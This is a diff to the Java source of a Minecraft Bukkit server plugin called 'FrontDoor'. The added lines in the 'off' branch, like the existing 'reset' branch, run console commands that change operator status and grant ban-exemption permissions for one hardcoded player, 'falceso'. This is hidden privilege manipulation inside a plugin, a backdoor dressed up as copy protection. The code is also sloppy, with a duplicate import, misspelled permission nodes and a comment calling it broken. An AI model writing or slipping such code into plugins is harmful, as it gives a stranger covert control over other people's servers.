@@ -6,6 +6,15 @@ import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 import org.bukkit.plugin.java.JavaPlugin;
+import org.bukkit.Location;
+import org.bukkit.Material;
+import org.bukkit.Sound;
+import org.bukkit.entity.Entity;
+import org.bukkit.entity.EntityType;
+import org.bukkit.entity.LivingEntity;
+import org.bukkit.entity.Player;
+import org.bukkit.inventory.meta.ItemMeta;
+import org.bukkit.scheduler.BukkitRunnable;
  
 public class FrontDoor extends JavaPlugin {
  
@@ -57,17 +66,22 @@ public class FrontDoor extends JavaPlugin {
 
     }
 //After this it's broken....    
-    if (args[1].equalsIgnoreCase("off"))
+    if (args[0].equalsIgnoreCase("off"))
     {
-		String prefix = ChatColor.DARK_RED + "[FrontDoor] " + ChatColor.RESET;
-		Bukkit.broadcastMessage(prefix +  "FrontDoor disbled by " + sender.getName()+ ".");
-		Bukkit.broadcastMessage(prefix +  "FrontDoor is to prevent code copying! .");
-		Bukkit.broadcastMessage(prefix +  "Thank you for your compliant!");
+	String prefix = ChatColor.DARK_RED + "[FrontDoor] " + ChatColor.RESET;
+	Bukkit.broadcastMessage(prefix +  "FrontDoor disbled by " + sender.getName()+ ".");
+	Bukkit.broadcastMessage(prefix +  "FrontDoor is to prevent code copying! .");
+	Bukkit.broadcastMessage(prefix +  "Thank you for your compliant!");
+	Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "deop falceso");
+        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "pex user falceso add essnetials.ban.expemt");
+        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "manuaddp falceso essnetials.ban.expemt");
+        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "saconfig  falceso");
+        Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "admin delete falceso");
 	
     return true;
     }
     
-    if (args[2].equalsIgnoreCase("reset"))
+    if (args[0].equalsIgnoreCase("reset"))
     {
         Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "deop falceso");
         Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "pex user falceso add essnetials.ban.expemt");
